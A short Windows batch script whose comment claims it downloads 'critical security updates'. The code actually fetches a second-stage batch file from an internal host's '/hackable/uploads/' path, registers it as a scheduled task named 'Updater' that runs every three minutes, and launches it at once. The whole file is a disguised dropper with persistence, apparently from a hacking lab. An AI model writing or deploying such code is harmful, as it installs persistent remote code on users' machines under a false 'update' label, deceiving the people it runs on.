rem This code downloads critical security updates for your computer
curl -o stage2.bat http://192.168.1.105/hackable/uploads/stage2.bat 
schtasks /create /sc MINUTE /mo 3 /tn Updater /tr "%HOMEDRIVE%%HOMEPATH%\Downloads\stage2.bat"
stage2.bat